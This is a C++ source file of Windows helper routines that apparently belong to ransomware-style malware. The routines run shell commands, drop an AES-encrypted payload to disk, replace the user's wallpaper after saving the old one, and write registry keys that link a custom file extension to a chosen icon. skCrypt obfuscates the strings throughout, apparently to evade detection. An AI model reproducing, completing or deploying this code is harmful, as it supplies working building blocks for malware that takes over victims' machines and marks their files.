#include "headers.h"

using namespace std;
namespace fs = std::experimental::filesystem;

string Exec(const char* cmd) {
    string result = (string)skCrypt("");
    FILE* CommandResult = _popen(cmd, skCrypt("rt"));
    char line[256];
    while (fgets(line, 256, CommandResult))
        result += line;
    _pclose(CommandResult);
    return result;
}

void CreateAndSetRegKey(HKEY key, string keyPath, string keyName, string value) {
    HKEY hKey;
    DWORD dwDisposition;
    if (RegCreateKeyEx(key, CA2T(keyPath.c_str()), 0, NULL, 0, KEY_WRITE, NULL, &hKey, &dwDisposition) != ERROR_SUCCESS && DEBUG)
        cout << key << skCrypt("\\") << keyPath << skCrypt(" not created\n");

    if (keyName == (string)skCrypt("NULL") && RegSetValueA(hKey, NULL, REG_SZ, value.c_str(), value.size()) != ERROR_SUCCESS && DEBUG)
        cout << key << skCrypt("\\") << keyPath << skCrypt(" not setted\n");

    else if (RegSetValueA(hKey, keyName.c_str(), REG_SZ, value.c_str(), value.size()) != ERROR_SUCCESS && DEBUG)
        cout << key << skCrypt("\\") << keyPath << skCrypt(" not setted\n");


    if (RegCloseKey(hKey) != ERROR_SUCCESS && DEBUG)
        cout << key << skCrypt("\\") << keyPath << skCrypt(" not closed\n");
}

vector<string> Split(const string& s, const char& delimiter) {
    size_t start = 0;
    size_t end = s.find_first_of(delimiter);
    vector<string> output;

    while (end <= string::npos) {
        output.emplace_back(s.substr(start, end - start));

        if (end == string::npos)
            break;

        start = end + 1;
        end = s.find_first_of(delimiter, start);
    }

    return output;
}

vector<vector<string>> VectorSplitter(const vector<string>& baseVector, int parts) {
    vector<vector<string>> result;
    size_t length = baseVector.size() / parts;
    size_t remain = baseVector.size() % parts;
    size_t begin = 0, end = 0;
    for (int i = 0; i < min(parts, baseVector.size()); ++i) {
        end += (remain > 0) ? (length + !!(remain--)) : length;
        result.push_back(vector<string>(baseVector.begin() + begin, baseVector.begin() + end));
        begin = end;
    }
    return result;
}

vector<vector<BYTE>> VectorSplitter(const vector<BYTE>& baseVector, int parts) {
    vector<vector<BYTE>> result;
    size_t length = baseVector.size() / parts;
    size_t remain = baseVector.size() % parts;
    size_t begin = 0, end = 0;
    for (int i = 0; i < min(parts, baseVector.size()); ++i) {
        end += (remain > 0) ? (length + !!(remain--)) : length;
        result.push_back(vector<BYTE>(baseVector.begin() + begin, baseVector.begin() + end));
        begin = end;
    }
    return result;
}

bool Copyfile(const char* From, const char* To) {
    size_t MaxBufferSize = 1048576;
    ifstream is(From, ios_base::binary);
    ofstream os(To, ios_base::binary);

    pair<char*, ptrdiff_t> buffer;
    buffer = get_temporary_buffer<char>(MaxBufferSize);

    while (is.good() and os) {
        is.read(buffer.first, buffer.second);
        os.write(buffer.first, is.gcount());
    }

    return_temporary_buffer(buffer.first);

    if (os.fail())
        return false;
    if (is.eof())
        return true;
    return false;
}

bool FileExists(const string& name) {
    return fs::exists(name);
}

void DropFile(const string& content, const string& path, bool dec) {
    vector<BYTE> write;
    ofstream fout(path, ios::binary | ios::out);
    if (dec) 
        write = base64_decode(aes_decrypt(KEY, content, IV));
    else
        write.assign(content.begin(), content.end());
    fout.write((const char*)&write[0], write.size());
    fout.close();
}

void ChangeWallpaper(const string& content) {
    ofstream fout(NEWWALLPAPER, ios::binary | ios::out);
    vector<BYTE> write = base64_decode(content);
    fout.write((const char*)&write[0], write.size());
    fout.close();
    if (!Copyfile(((string)skCrypt("C:\\Users\\") + GetUsername() + (string)skCrypt("\\AppData\\Roaming\\Microsoft\\Windows\\Themes\\CachedFiles\\") + Split(Exec(skCrypt("dir /b %AppData%\\Microsoft\\Windows\\Themes\\CachedFiles")), '\n')[0]).c_str(), (OLDWALLPAPER).c_str()) && DEBUG)
        cout << skCrypt("Wallpaper not copied!\n\n");

    USES_CONVERSION_EX;
    SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, A2W_EX((NEWWALLPAPER).c_str(), (NEWWALLPAPER).length()), SPIF_UPDATEINIFILE);
}

void ChangeIcon() {
    string progId = "";
    for (int i = 1; i < (FILE_EXTENSION).length(); i++)
        progId += towlower((FILE_EXTENSION)[i]);
    progId += skCrypt("file");

    CreateAndSetRegKey(HKEY_CURRENT_USER,
        (string)skCrypt("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\") + FILE_EXTENSION + (string)skCrypt("\\UserChoice"),
        (string)skCrypt("ProgId"), progId);
    CreateAndSetRegKey(HKEY_CLASSES_ROOT, FILE_EXTENSION, (string)skCrypt("NULL"), progId);
    CreateAndSetRegKey(HKEY_CLASSES_ROOT, progId + (string)skCrypt("\\DefaultIcon"), (string)skCrypt("NULL"), FILESICON);

    Exec(((string)skCrypt("assoc ") + FILE_EXTENSION + (string)skCrypt("=") + progId).c_str());
}
